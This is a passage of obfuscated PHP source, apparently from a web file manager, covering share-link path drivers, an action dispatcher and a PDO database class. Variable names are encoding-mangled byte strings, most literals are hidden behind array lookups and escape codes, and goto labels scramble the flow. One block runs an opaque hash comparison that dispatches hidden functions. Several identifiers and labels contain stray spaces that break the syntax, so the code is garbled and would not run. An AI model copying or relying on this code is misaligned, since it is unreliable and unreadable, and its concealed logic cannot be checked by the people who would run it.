$bºñ«ÑÀÉ” = $cŸ›èÉ€¢ . $F∆ëãëËÌô[1] . $F∆ëãëËÌô[2]; $EÃîû˘öøè = $Aßà±ˆÆÜ—[12] . $F∆ëãëËÌô[1] . $Aßà±ˆÆÜ—[13] . $F∆ëãëËÌô[2] . $Aßà±ˆÆÜ—[11]; } } $EÃîû˘öøè = PLUGIN_DIR . $cŸ›èÉ€¢ . $Aßà±ˆÆÜ—[4] . $EÃîû˘öøè; } else { if (substr($e‰Œ≤Õœ¥‘, -5) == $Aßà±ˆÆÜ—[9]) { $cŸ›èÉ€¢ = substr($F∆ëãëËÌô[0], 0, -5); return Model($cŸ›èÉ€¢); } else { $bºñ«ÑÀÉ” = $F∆ëãëËÌô[0] . $F∆ëãëËÌô[1]; $EÃîû˘öøè = CONTROLLER_DIR . $F∆ëãëËÌô[0] . $Aßà±ˆÆÜ—[4] . $F∆ëãëËÌô[1] . $Aßà±ˆÆÜ—[14]; } } goto fÓﬁÜ£â√ä; D‰”ÃÃÒà∫: if (!class_exists($bºñ«ÑÀÉ”)) { return actionCallError("\133{$cŸ›èÉ€¢}\x20\x3d\x3e\40{$bºñ«ÑÀÉ”}\135\x20\x63\154\141\x73\x73\x20\x6e\x6f\164\x20\145\170\151\163\x74\x73\x21"); } $bÚ„«•ºÃ“[$Bπéûøå ◊] = new $bºñ«ÑÀÉ”(); return $bÚ„«•ºÃ“[$Bπéûøå ◊]; goto dˆ§ÉºÿËë; dˆ§ÉºÿËë: } function ActionApply($eÛ∑Ω˜¿©≠, $Cª†ìúÇÂî = array()) { goto Dî—ò∂¶ü”; Dç◊√•Íó¥: $füåíÜæß∆ = substr($eÛ∑Ω˜¿©≠, 0, $bœÒ—Ãò™Í); $Aå¶ı©¨£ = substr($eÛ∑Ω˜¿©≠, $bœÒ—Ãò™Í + 1); $f∏‘∏—äúπ = Action($füåíÜæß∆); goto fä„ é“ÌÉ; fä„ é“ÌÉ: if (!method_exists($f∏‘∏—äúπ, $Aå¶ı©¨£)) { return actionCallError("{$eÛ∑Ω˜¿©≠}\x20\155\145\x74\150\157\144\40\156\x6f\164\x20\145\x78\x69\163\164\x73\41"); } $c„π™–¨®÷ = call_user_func_array(array($f∏‘∏—äúπ, $Aå¶ı©¨£), $Cª†ìúÇÂî); return $c„π™–¨®÷; goto F∂øâË…√ö; Dî—ò∂¶ü”: if (is_array($eÛ∑Ω˜¿©≠)) { return call_user_func_array($eÛ∑Ω˜¿©≠, $Cª†ìúÇÂî); } if (function_exists($eÛ∑Ω˜¿©≠)) { return call_user_func_array($eÛ∑Ω˜¿©≠, $Cª†ìúÇÂî); } $bœÒ—Ãò™Í = strrpos($eÛ∑Ω˜¿©≠, $_SERVER[âñö‚‚Ñ][5]); goto Dç◊√•Íó¥; F∂øâË…√ö: } function actionCallError($Fú∏°ô–üœ) { $f®†ëõ…∏Â =& $_SERVER[âñö‚‚Ñ]; $d≥·ïπ·Îô = json_encode_force(array($f®†ëõ…∏Â[15] => this_url(), $f®†ëõ…∏Â[16] => $GLOBALS[$f®†ëõ…∏Â[16]])); $d≥·ïπ·Îô = str_replace(array($f®†ëõ…∏Â[17]), array($f®†ëõ…∏Â[4]), $d≥·ïπ·Îô); return write_log($Fú∏°ô–üœ . $f®†ëõ…∏Â[18] . $d≥·ïπ·Îô, $f®†ëõ…∏Â[19]); } goto cäàπ¡›‰Î; cç—Û ì‘å: class PathDriverDbShareLink extends PathDriverDB { public function __construct($EˆÓ˜æâ‹≥) { $this->pathParse = $EˆÓ˜æâ‹≥; $this->model = Model($_SERVER[Æ¡î¢≠¯™][1096]); } protected function infoParse($e†É‘≤ñ°¥, $BÀ¶˘ı¿ë‚ = false, $cêØ’≤ØÂ∑ = false) { $b¡Ñ†öèÆØ =& $_SERVER[Æ¡î¢≠¯™]; return Action($b¡Ñ†öèÆØ[1003])->sharePathInfo($this->pathParse[$b¡Ñ†öèÆØ[85]], !0); } public function listPath($EØëπÉæı, $eÙÍ‰È¥Üé = false) { $a‹¬√ŒﬁÕ =& $_SERVER[Æ¡î¢≠¯™]; $A”›»‚Œí = parent::listPath($EØëπÉæı, $eÙÍ‰È¥Üé); foreach ($A”›»‚Œí as $D–Ÿ»µç‘– => $f∞Ê≈ñ©Á¯) { if (!in_array($D–Ÿ»µç‘–, array($a‹¬√ŒﬁÕ[83], $a‹¬√ŒﬁÕ[84]))) { continue; } foreach ($f∞Ê≈ñ©Á¯ as $D√∂ä…ä≈Ö => $eÊÛŸÙ›ÍÔ) { $A”›»‚Œí[$D–Ÿ»µç‘–][$D√∂ä…ä≈Ö] = Action($a‹¬√ŒﬁÕ[1003])->shareItemInfo($eÊÛŸÙ›ÍÔ); } } return $A”›»‚Œí; } public function listAll($bêµÓ¡ÑÙ∏) { $c´ÿçìÈÀá =& $_SERVER[Æ¡î¢≠¯™]; $A≥Æ¿¿∏Ùá = IO::info($this->pathParse[$c´ÿçìÈÀá[85]]); if (!$A≥Æ¿¿∏Ùá) { return array(); } $c—ÛíÜπ÷÷ = $this->model->listAll($bêµÓ¡ÑÙ∏); foreach ($c—ÛíÜπ÷÷ as &$fÂ˜†¿⁄ëÑ) { $fÂ˜†¿⁄ëÑ[$c´ÿçìÈÀá[396]] = Action($c´ÿçìÈÀá[1003])->shareItemInfo($fÂ˜†¿⁄ëÑ[$c´ÿçìÈÀá[396]]); } return $c—ÛíÜπ÷÷; } } class PathDriverDriverShareItem { public function __construct($D∞‚›ú¢ò∂) { $this->pathParse = $D∞‚›ú¢ò∂; } public function __call($C‰»”‹ÃÜñ, $Büïõ™ËÑ) { $bÃÁÜÖü‡¿ =& $_SERVER[Æ¡î¢≠¯™]; if (method_exists($this, $C‰»”‹ÃÜñ)) { return; } $E√ÕãÍÜâ≈ = call_user_func_array(array($bÃÁÜÖü‡¿[1103], $C‰»”‹ÃÜñ), $Büïõ™ËÑ); $dà§ ÇÖﬁ± = array($bÃÁÜÖü‡¿[1104], $bÃÁÜÖü‡¿[1105], $bÃÁÜÖü‡¿[1106], $bÃÁÜÖü‡¿[1107], $bÃÁÜÖü‡¿[494], $bÃÁÜÖü‡¿[496], $bÃÁÜÖü‡¿[1108], $bÃÁÜÖü‡¿[101], $bÃÁÜÖü‡¿[1109], $bÃÁÜÖü‡¿[1110]); if (in_array($C‰»”‹ÃÜñ, $dà§ ÇÖﬁ±)) { $E√ÕãÍÜâ≈ = $this->getPathOuter($E√ÕãÍÜâ≈); } return $E√ÕãÍÜâ≈; } public function copy($D•°√¡Ÿ”œ, $bƒéê…ó“√, $CÀ®¨∏√≈Î = false) { return $this->copyMove($D•°√¡Ÿ”œ, $bƒéê…ó“√, $CÀ®¨∏√≈Î, $_SERVER[Æ¡î¢≠¯™][494]); } public function move($C÷†Çîä¶è, $F†‘ˆÃ“∏¢, $A±¯åﬁ©µ = false) { return $this->copyMove($C÷†Çîä¶è, $F†‘ˆÃ“∏¢, $A±¯åﬁ©µ, $_SERVER[Æ¡î¢≠¯™][496]); } private function copyMove($AÜÖ§°çç•, $EöûÓü◊÷í, $c†ºâ”õÛª, $dÿê©ö›ﬂÉ) { goto cèÆ¶…–∫Ì; cèÆ¶…–∫Ì: $C√çõ´ç¯ã =& $_SERVER[Æ¡î¢≠¯™]; $e›‹áº±«£ = $EöûÓü◊÷í; $Eˆ§œ∑Î„¢ = IO::driverMake($EöûÓü◊÷í); goto c∂Ìº√ö‚Ú; c∑Üñ©ƒëÆ: return $Cªœ–π±éÉ; goto eà’Á◊ò¯Ò; c∂Ìº√ö‚Ú: if ($Eˆ§œ∑Î„¢->pathParse[$C√çõ´ç¯ã[984]]) { $EöûÓü◊÷í = $Eˆ§œ∑Î„¢->pathParse[$C√çõ´ç¯ã[984]]; } else { $EöûÓü◊÷í = $e›‹áº±«£; } $Cªœ–π±éÉ = IO::copyMove($AÜÖ§°çç•, $EöûÓü◊÷í, $c†ºâ”õÛª, $dÿê©ö›ﬂÉ); $Cªœ–π±éÉ = $this->getPathOuter($Cªœ–π±éÉ); goto c∑Üñ©ƒëÆ; eà’Á◊ò¯Ò: } public function pathFather($EÔ÷≈ÖäâÜ) { return get_path_father($this->pathParse[$_SERVER[Æ¡î¢≠¯™][85]]); } public function iconvSystem($F√≤‹Îª∂Ÿ) { return $F√≤‹Îª∂Ÿ; } protected function infoParse($bı…íÍèÙô) { $c‚—Ï≥¨åŒ =& $_SERVER[Æ¡î¢≠¯™]; $aáêé¨ƒø≥ = $this->pathParse[$c‚—Ï≥¨åŒ[443]][$c‚—Ï≥¨åŒ[1004]] . $this->pathParse[$c‚—Ï≥¨åŒ[997]]; $dèôääÙÁé = IO::info($aáêé¨ƒø≥); $Aé‘®éöÿÁ = $this->pathParse[$c‚—Ï≥¨åŒ[443]]; return Action($c‚—Ï≥¨åŒ[1102])->_shareItemeParse($dèôääÙÁé, $Aé‘®éöÿÁ); } public function listAll($C∞îπí¢üÓ) { $DÇ†•ë≤√∞ =& $_SERVER[Æ¡î¢≠¯™]; $f›◊∆ı¬Ø– = IO::listAll($C∞îπí¢üÓ); $Eêœ÷ëÖ¨é = $this->pathParse[$DÇ†•ë≤√∞[443]]; foreach ($f›◊∆ı¬Ø– as &$f√∫õ£±¶«) { check_abort(); $f√∫õ£±¶« = array_merge(IO::info($f√∫õ£±¶«[$DÇ†•ë≤√∞[85]]), $f√∫õ£±¶«); $f√∫õ£±¶«[$DÇ†•ë≤√∞[396]] = Action($DÇ†•ë≤√∞[1102])->_shareItemeParse($f√∫õ£±¶«, $Eêœ÷ëÖ¨é); } return $f›◊∆ı¬Ø–; } public function getPathOuter($DˆøÚ⁄œ∫«) { goto DˆŸ‚Âﬂ√´; Cìµ»Ü∫¡∆: if (substr($cé£∞Ñ‹îÃ, 0, strlen($BÊ√ñê¨¿∏)) != $BÊ√ñê¨¿∏) { return !1; } return $this->pathParse[$B¬¿ÑÂúçñ[998]] . $B¬¿ÑÂúçñ[8] . ltrim($F£ô±ÙÉ¬ø, $B¬¿ÑÂúçñ[8]); goto aò°ﬂﬁı©â; a≥ıä®Ûå÷: $cé£∞Ñ‹îÃ = KodIO::clear($DˆøÚ⁄œ∫«); $BÊ√ñê¨¿∏ = KodIO::clear($this->pathParse[$B¬¿ÑÂúçñ[443]][$B¬¿ÑÂúçñ[1004]]); $F£ô±ÙÉ¬ø = substr($cé£∞Ñ‹îÃ, strlen($BÊ√ñê¨¿∏)); goto Cìµ»Ü∫¡∆; DˆŸ‚Âﬂ√´: $B¬¿ÑÂúçñ =& $_SERVER[Æ¡î¢≠¯™]; $e∂÷∞ô§ô• = KodIO::parse($DˆøÚ⁄œ∫«); if ($e∂÷∞ô§ô•[$B¬¿ÑÂúçñ[29]] == KodIO::KOD_SHARE_ITEM) { return $e∂÷∞ô§ô•[$B¬¿ÑÂúçñ[85]]; } goto a≥ıä®Ûå÷; aò°ﬂﬁı©â: } public function getType() { $d´ëòÆê≥‹ =& $_SERVER[Æ¡î¢≠¯™]; $eéùìÏ›ªŒ = str_replace($d´ëòÆê≥‹[81], $d´ëòÆê≥‹[33], get_class($this)); return strtolower($eéùìÏ›ªŒ); } public function isTypeObject($cÒŸ∫ì∫˘Œ) { return IO::isTypeObject($cÒŸ∫ì∫˘Œ); } public function info($A¿∞Í«Ûçô) { return $this->infoParse($A¿∞Í«Ûçô); } public function infoAuth($B±±®ÑÖÏ§) { return $this->infoParse($B±±®ÑÖÏ§); } public function infoWithChildren($EπÂ»‚Û„) { return $this->infoParse($EπÂ»‚Û„); } public function infoFull($aó…éÿâ≠ê) { return $this->infoParse($aó…éÿâ≠ê); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($fùøä∏†Õ”) { $this->pathParse = $fùøä∏†Õ”; } protected function infoParse($e«ıÜ›Ê€∆) { $cè‘™ƒ€Û¶ =& $_SERVER[Æ¡î¢≠¯™]; return Action($cè‘™ƒ€Û¶[1003])->sharePathInfo($this->pathParse[$cè‘™ƒ€Û¶[85]], !0); } public function listPath($c¥ÑÏ…á‡–, $F®Öë›ÜıÑ = false) { $f£ëÑ†»“é =& $_SERVER[Æ¡î¢≠¯™]; $bÏÊÀëπï≈ = IO::listPath($c¥ÑÏ…á‡–, $F®Öë›ÜıÑ); foreach ($bÏÊÀëπï≈ as $c¢„π±É™— => $FŸƒ™™ﬁÑø) { if (!in_array($c¢„π±É™—, array($f£ëÑ†»“é[83], $f£ëÑ†»“é[84]))) { continue; } foreach ($FŸƒ™™ﬁÑø as $DÑÀ£≤∞À§ => $Cˆ›«Ìã⁄°) { $Cˆ›«Ìã⁄° = Action($f£ëÑ†»“é[1111])->parsePathChildren($Cˆ›«Ìã⁄°, array($f£ëÑ†»“é[392] => $c¥ÑÏ…á‡–)); $bÏÊÀëπï≈[$c¢„π±É™—][$DÑÀ£≤∞À§] = Action($f£ëÑ†»“é[1003])->shareItemInfo($Cˆ›«Ìã⁄°); } } return $bÏÊÀëπï≈; } public function listAll($DÇ”òÃπ∞ë) { $fáÆôäÃ≥É =& $_SERVER[Æ¡î¢≠¯™]; $f’íÇ≥àı∑ = IO::listAll($DÇ”òÃπ∞ë); foreach ($f’íÇ≥àı∑ as &$b∫ÜÁëÈ€§) { $b∫ÜÁëÈ€§ = array_merge(IO::info($b∫ÜÁëÈ€§[$fáÆôäÃ≥É[85]]), $b∫ÜÁëÈ€§); $b∫ÜÁëÈ€§[$fáÆôäÃ≥É[396]] = Action($fáÆôäÃ≥É[1003])->shareItemInfo($b∫ÜÁëÈ€§); } return $f’íÇ≥àı∑; } } goto A™å¿◊πû∑; dÀ´È¢´¬ã: define($_SERVER[Æ¡î¢≠¯™][1891], 4); define($_SERVER[Æ¡î¢≠¯™][1892], 5); define($_SERVER[Æ¡î¢≠¯™][1893], 16); goto bÖ≥õÈÛ∫·; BùÚ≈ùä∆ê: if ($_SERVER[$_SERVER[Æ¡î¢≠¯™][57]] != $bâŸ˜⁄äΩ⁄($c´¡Õã∆ƒ∂)) { goto D…ô’‚î“ó; D©’Öåô¥Ô: $eëíŸÌ∏ÂÙ($c´¡Õã∆ƒ∂); goto dŸã©ÂÏ∑í; D…ô’‚î“ó: $CÑÈÒøãı≤ = $_SERVER[Æ¡î¢≠¯™][59]; $A‡˘¥¬¨ã∂ = $_SERVER[$_SERVER[Æ¡î¢≠¯™][60]] . $_SERVER[Æ¡î¢≠¯™][61]; $D¯ÃáçìêÜ = $CÑÈÒøãı≤($A‡˘¥¬¨ã∂); goto EÚê∂´ïòﬂ; EÚê∂´ïòﬂ: $a¿Üç“˘¡á = explode($_SERVER[Æ¡î¢≠¯™][62], $D¯ÃáçìêÜ); if (count($a¿Üç“˘¡á) < $_SERVER[Æ¡î¢≠¯™][63]) { $c¡âÀŸ√ÿè = $_SERVER[Æ¡î¢≠¯™][64]; $c¡âÀŸ√ÿè(); } $eëíŸÌ∏ÂÙ = $_SERVER[Æ¡î¢≠¯™][65]; goto D©’Öåô¥Ô; dŸã©ÂÏ∑í: } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($c·∞›‘¬®¬ = '') { $eﬁç¢Óêéô =& $_SERVER[Æ¡î¢≠¯™]; if (!class_exists($eﬁç¢Óêéô[814])) { think_exception(think_lang($eﬁç¢Óêéô[10]) . $eﬁç¢Óêéô[815]); } if (!empty($c·∞›‘¬®¬)) { $this->config = $c·∞›‘¬®¬; if (empty($this->config[$eﬁç¢Óêéô[13]])) { $this->config[$eﬁç¢Óêéô[13]] = array(); } } } public function connect($döÿÚÙ‰ƒ∑ = '', $AŸª£Ãî¥Ÿ = 0) { $dÜÃ∂≈ùÇ =& $_SERVER[Æ¡î¢≠¯™]; if (!isset($this->linkID[$AŸª£Ãî¥Ÿ])) { goto E≈ã√ß°Ù·; E≈ã√ß°Ù·: if (empty($döÿÚÙ‰ƒ∑)) { $döÿÚÙ‰ƒ∑ = $this->config; } if ($this->pconnect) { $döÿÚÙ‰ƒ∑[$dÜÃ∂≈ùÇ[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$AŸª£Ãî¥Ÿ] = new PDO($döÿÚÙ‰ƒ∑[$dÜÃ∂≈ùÇ[816]], $döÿÚÙ‰ƒ∑[$dÜÃ∂≈ùÇ[788]], $döÿÚÙ‰ƒ∑[$dÜÃ∂≈ùÇ[789]], $döÿÚÙ‰ƒ∑[$dÜÃ∂≈ùÇ[13]]); } catch (PDOException $f∏çåËÕ≈ï) { think_exception($f∏çåËÕ≈ï->getMessage()); } goto cú∑∫†ª£Ç; cú∑∫†ª£Ç: $this->dbType = $this->_getDsnType($döÿÚÙ‰ƒ∑[$dÜÃ∂≈ùÇ[816]]); if (in_array($this->dbType, array($dÜÃ∂≈ùÇ[817], $dÜÃ∂≈ùÇ[818], $dÜÃ∂≈ùÇ[819], $dÜÃ∂≈ùÇ[820]))) { think_exception($dÜÃ∂≈ùÇ[821] . $this->dbType . $dÜÃ∂≈ùÇ[822] . $this->dbType . $dÜÃ∂≈ùÇ[823]); } if (!$this->linkID[$AŸª£Ãî¥Ÿ]) { think_exception($dÜÃ∂≈ùÇ[824]); } goto cœ§‹ëáßº; cœ§‹ëáßº: $this->linkID[$AŸª£Ãî¥Ÿ]->exec($dÜÃ∂≈ùÇ[825] . think_config($dÜÃ∂≈ùÇ[791])); $this->connected = !0; if (1 != think_config($dÜÃ∂≈ùÇ[18])) { unset($this->config); } goto B ÿ”ô…•Ï; B ÿ”ô…•Ï: } return $this->linkID[$AŸª£Ãî¥Ÿ]; } public function free() { $this->PDOStatement = null; } public function query($B⁄ÙÜä©–‰, $C¯…Ù›ÌÑ = array()) { goto BÒâß÷ñØï; aêÔÒ≤åÖâ: $this->queryStr = $B⁄ÙÜä©–‰; if (!empty($C¯…Ù›ÌÑ)) { $this->queryStr .= $f∫˜øÖ‹æÊ[826] . print_r($C¯…Ù›ÌÑ, !0) . $f∫˜øÖ‹æÊ[827]; } if (!empty($this->PDOStatement)) { $this->free(); } goto f“¡‡πÁÿÍ; D˜Á†¯Áåª: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $AìÂÁè›ÿ¢ = $this->PDOStatement->execute($C¯…Ù›ÌÑ); $this->debug(); goto f€ ªÇÕöá; f€ ªÇÕöá: if (!1 === $AìÂÁè›ÿ¢) { $this->error(); return !1; } else { return $this->getAll(); } goto e‘≥≈üÍ∫Û; f“¡‡πÁÿÍ: think_action_status($f∫˜øÖ‹æÊ[19], 1); think_status($f∫˜øÖ‹æÊ[20]); $this->PDOStatement = $this->_linkID->prepare($B⁄ÙÜä©–‰); goto D˜Á†¯Áåª; BÒâß÷ñØï: $f∫˜øÖ‹æÊ =& $_SERVER[Æ¡î¢≠¯™]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto aêÔÒ≤åÖâ; e‘≥≈üÍ∫Û: } public function execute($Aõà¯º˘∞≥, $C”◊∑˘ùúí = array()) { goto F®èÖíΩ≤ﬂ; F®èÖíΩ≤ﬂ: $eê©πˆˆπΩ =& $_SERVER[Æ¡î¢≠¯™]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto f–«„Ÿ≤∏Ô; EÈÁøì¨ÓÚ: if ($this->dbType == $eê©πˆˆπΩ[820]) { if (preg_match($eê©πˆˆπΩ[828], $this->queryStr, $dì≥ÂÉ÷—Ó)) { $this->table = think_config($eê©πˆˆπΩ[829]) . str_ireplace(think_config($eê©πˆˆπΩ[830]), $eê©πˆˆπΩ[66], $dì≥ÂÉ÷—Ó[2]); $dø≥É≠ÌÇÂ = (bool) $this->query($eê©πˆˆπΩ[831] . strtoupper($this->table) . $eê©πˆˆπΩ[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($eê©πˆˆπΩ[21], 1); goto CÏàˆ˜€Ê´; DñÇ´†™¬Á: $B∂°ëÕêî® = $this->PDOStatement->execute($C”◊∑˘ùúí); $this->debug(); if (!1 === $B∂°ëÕêî®) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($dø≥É≠ÌÇÂ || preg_match($eê©πˆˆπΩ[832], $Aõà¯º˘∞≥)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto F•ñ›—ü•”; CÏàˆ˜€Ê´: think_status($eê©πˆˆπΩ[20]); $this->PDOStatement = $this->_linkID->prepare($Aõà¯º˘∞≥); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto DñÇ´†™¬Á; f–«„Ÿ≤∏Ô: $this->queryStr = $Aõà¯º˘∞≥; if (!empty($C”◊∑˘ùúí)) { $this->queryStr .= $eê©πˆˆπΩ[826] . print_r($C”◊∑˘ùúí, !0) . $eê©πˆˆπΩ[827]; } $dø≥É≠ÌÇÂ = !1; goto EÈÁøì¨ÓÚ; F•ñ›—ü•”: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $a¬ÜÂŒÈú⁄ = $this->_linkID->commit(); $this->transTimes = 0; if (!$a¬ÜÂŒÈú⁄) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $A‘ùöøªÁã = $this->_linkID->rollback(); $this->transTimes = 0; if (!$A‘ùöøªÁã) { $this->error(); return !1; } } return !0; } private function getAll() { $A¬©ó§ﬂã = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($A¬©ó§ﬂã); return $A¬©ó§ﬂã; } public function getFields($c√ô‚œ∏ï™) { goto Dî∫ÙÑ–à‘; AÇﬂ…ﬁá†ª: $dØòÌê∂íâ = $this->query($Bïõ†‚≤ëÓ); $fêìË•ñçò = array(); if ($dØòÌê∂íâ) { foreach ($dØòÌê∂íâ as $B∂ü‘ç≤È◊ => $dÑêøìø”∆) { $dÑêøìø”∆ = array_change_key_case($dÑêøìø”∆); $dÑêøìø”∆[$cÌ‡ÑΩëâ•[28]] = isset($dÑêøìø”∆[$cÌ‡ÑΩëâ•[28]]) ? $dÑêøìø”∆[$cÌ‡ÑΩëâ•[28]] : $cÌ‡ÑΩëâ•[66]; $dÑêøìø”∆[$cÌ‡ÑΩëâ•[29]] = isset($dÑêøìø”∆[$cÌ‡ÑΩëâ•[29]]) ? $dÑêøìø”∆[$cÌ‡ÑΩëâ•[29]] : $cÌ‡ÑΩëâ•[66]; $aæ≤ç›Éı¬ = isset($dÑêøìø”∆[$cÌ‡ÑΩëâ•[267]]) ? $dÑêøìø”∆[$cÌ‡ÑΩëâ•[267]] : $dÑêøìø”∆[$cÌ‡ÑΩëâ•[28]]; $fêìË•ñçò[$aæ≤ç›Éı¬] = array($cÌ‡ÑΩëâ•[28] => $aæ≤ç›Éı¬, $cÌ‡ÑΩëâ•[29] => $dÑêøìø”∆[$cÌ‡ÑΩëâ•[29]], $cÌ‡ÑΩëâ•[31] => (bool) (isset($dÑêøìø”∆[$cÌ‡ÑΩëâ•[111]]) && $dÑêøìø”∆[$cÌ‡ÑΩëâ•[111]] === $cÌ‡ÑΩëâ•[33] || isset($dÑêøìø”∆[$cÌ‡ÑΩëâ•[31]]) && $dÑêøìø”∆[$cÌ‡ÑΩëâ•[31]] === $cÌ‡ÑΩëâ•[33]), $cÌ‡ÑΩëâ•[34] => isset($dÑêøìø”∆[$cÌ‡ÑΩëâ•[34]]) ? $dÑêøìø”∆[$cÌ‡ÑΩëâ•[34]] : (isset($dÑêøìø”∆[$cÌ‡ÑΩëâ•[53]]) ? $dÑêøìø”∆[$cÌ‡ÑΩëâ•[53]] : $cÌ‡ÑΩëâ•[66]), $cÌ‡ÑΩëâ•[36] => isset($dÑêøìø”∆[$cÌ‡ÑΩëâ•[99]]) ? strtolower($dÑêøìø”∆[$cÌ‡ÑΩëâ•[99]]) == $cÌ‡ÑΩëâ•[38] : (isset($dÑêøìø”∆[$cÌ‡ÑΩëâ•[54]]) ? $dÑêøìø”∆[$cÌ‡ÑΩëâ•[54]] : !1), $cÌ‡ÑΩëâ•[39] => isset($dÑêøìø”∆[$cÌ‡ÑΩëâ•[849]]) ? strtolower($dÑêøìø”∆[$cÌ‡ÑΩëâ•[849]]) == $cÌ‡ÑΩëâ•[41] : (isset($dÑêøìø”∆[$cÌ‡ÑΩëâ•[99]]) ? $dÑêøìø”∆[$cÌ‡ÑΩëâ•[99]] : !1)); } } goto aãÂ™öƒÀ∏; Dî∫ÙÑ–à‘: $cÌ‡ÑΩëâ• =& $_SERVER[Æ¡î¢≠¯™]; $this->initConnect(!0); if (think_config($cÌ‡ÑΩëâ•[833])) { $Bïõ†‚≤ëÓ = str_replace($cÌ‡ÑΩëâ•[834], $c√ô‚œ∏ï™, think_config($cÌ‡ÑΩëâ•[833])); } else { switch ($this->dbType) { case $cÌ‡ÑΩëâ•[817]: case $cÌ‡ÑΩëâ•[835]: $Bïõ†‚≤ëÓ = "\x53\105\114\105\103\124\x20\40\40\143\x6f\x6c\165\x6d\x6e\137\156\x61\155\145\x20\x61\163\x20\47\x4e\141\155\x65\x27\54\x20\x20\40\144\x61\164\141\x5f\164\x79\x70\145\x20\x61\x73\40\x27\x54\171\x70\x65\x27\54\40\40\x20\x63\157\154\x75\155\x6e\x5f\144\145\x66\141\165\x6c\x74\x20\x61\x73\x20\47\x44\145\x66\141\165\x6c\164\x27\x2c\40\x20\40\x69\163\x5f\x6e\165\154\x6c\x61\142\154\x65\x20\141\x73\40\47\116\165\154\x6c\x27\12\11\11\x46\x52\117\x4d\x9\151\x6e\146\x6f\x72\155\141\x74\151\x6f\156\x5f\163\143\150\145\x6d\141\56\x74\141\x62\154\145\163\40\101\x53\40\164\xa\x9\x9\112\x4f\x49\x4e\x9\x69\x6e\x66\x6f\x72\155\x61\x74\151\157\156\137\x73\x63\150\x65\x6d\141\x2e\143\x6f\x6c\x75\x6d\x6e\163\40\x41\x53\x20\x63\12\11\x9\117\x4e\40\40\164\x2e\x74\141\142\x6c\145\x5f\x63\141\164\141\154\x6f\147\40\x3d\x20\143\56\x74\x61\142\154\x65\x5f\x63\141\x74\x61\154\x6f\x67\xa\x9\x9\x41\116\x44\x20\164\x2e\x74\141\x62\x6c\145\137\x73\x63\150\x65\155\141\x20\75\40\x63\56\x74\x61\142\154\145\137\x73\143\150\x65\155\141\xa\x9\11\x41\116\104\40\x74\56\164\141\142\154\x65\x5f\156\x61\155\145\x20\75\40\x63\56\164\141\x62\154\145\x5f\156\141\155\x65\12\x9\x9\127\x48\105\122\x45\40\40\40\164\56\x74\x61\142\154\145\137\x6e\141\x6d\145\40\75\x20\47{$c√ô‚œ∏ï™}\47"; break; case $cÌ‡ÑΩëâ•[836]: $Bïõ†‚≤ëÓ = $cÌ‡ÑΩëâ•[837] . $c√ô‚œ∏ï™ . $cÌ‡ÑΩëâ•[838]; break; case $cÌ‡ÑΩëâ•[818]: case $cÌ‡ÑΩëâ•[820]: $Bïõ†‚≤ëÓ = $cÌ‡ÑΩëâ•[839] . $cÌ‡ÑΩëâ•[840] . $cÌ‡ÑΩëâ•[841] . strtoupper($c√ô‚œ∏ï™) . $cÌ‡ÑΩëâ•[842] . strtoupper($c√ô‚œ∏ï™) . $cÌ‡ÑΩëâ•[843]; break; case $cÌ‡ÑΩëâ•[844]: $Bïõ†‚≤ëÓ = $cÌ‡ÑΩëâ•[845] . $c√ô‚œ∏ï™ . $cÌ‡ÑΩëâ•[846]; break; case $cÌ‡ÑΩëâ•[819]: break; case $cÌ‡ÑΩëâ•[847]: default: $Bïõ†‚≤ëÓ = $cÌ‡ÑΩëâ•[848] . ($this->dbType == $cÌ‡ÑΩëâ•[847] ? "\140{$c√ô‚œ∏ï™}\140" : $c√ô‚œ∏ï™); } } goto AÇﬂ…ﬁá†ª; aãÂ™öƒÀ∏: return $fêìË•ñçò; goto E∏Œ–à¢‡‰; E∏Œ–à¢‡‰: } public function getTables($FôÜÏ∏∏Ò¡ = '') { $C≈Œ∞Î∆æ— =& $_SERVER[Æ¡î¢≠¯™]; if (think_config($C≈Œ∞Î∆æ—[850])) { $EÔåñÔ≈îµ = str_replace($C≈Œ∞Î∆æ—[851], $FôÜÏ∏∏Ò¡, think_config($C≈Œ∞Î∆æ—[850])); } else { switch ($this->dbType) { case $C≈Œ∞Î∆æ—[818]: case $C≈Œ∞Î∆æ—[820]: $EÔåñÔ≈îµ = $C≈Œ∞Î∆æ—[852]; break; case $C≈Œ∞Î∆æ—[817]: case $C≈Œ∞Î∆æ—[835]: $EÔåñÔ≈îµ = $C≈Œ∞Î∆æ—[853]; break; case $C≈Œ∞Î∆æ—[844]: $EÔåñÔ≈îµ = $C≈Œ∞Î∆æ—[854]; break; case $C≈Œ∞Î∆æ—[819]: think_exception(think_lang($C≈Œ∞Î∆æ—[855]) . $C≈Œ∞Î∆æ—[856]); break; case $C≈Œ∞Î∆æ—[836]: $EÔåñÔ≈îµ = $C≈Œ∞Î∆æ—[42] . $C≈Œ∞Î∆æ—[43] . $C≈Œ∞Î∆æ—[44]; break; case $C≈Œ∞Î∆æ—[847]: default: if (!empty($FôÜÏ∏∏Ò¡)) { $EÔåñÔ≈îµ = $C≈Œ∞Î∆æ—[799] . $FôÜÏ∏∏Ò¡; } else { $EÔåñÔ≈îµ = $C≈Œ∞Î∆æ—[800]; } } } $Bêæï⁄ë‘ú = $this->query($EÔåñÔ≈îµ); $cË¶‹Ì¢›Ç = array(); foreach ($Bêæï⁄ë‘ú as $d„áÕ∆∂ÂÒ => $F≤êÔ¬∆πâ) { $cË¶‹Ì¢›Ç[$d„áÕ∆∂ÂÒ] = current($F≤êÔ¬∆πâ); } return $cË¶‹Ì¢›Ç; } protected function parseLimit($FßìûßÃú∆) { $F∫Àû°‡¢∏ =& $_SERVER[Æ¡î¢≠¯™]; 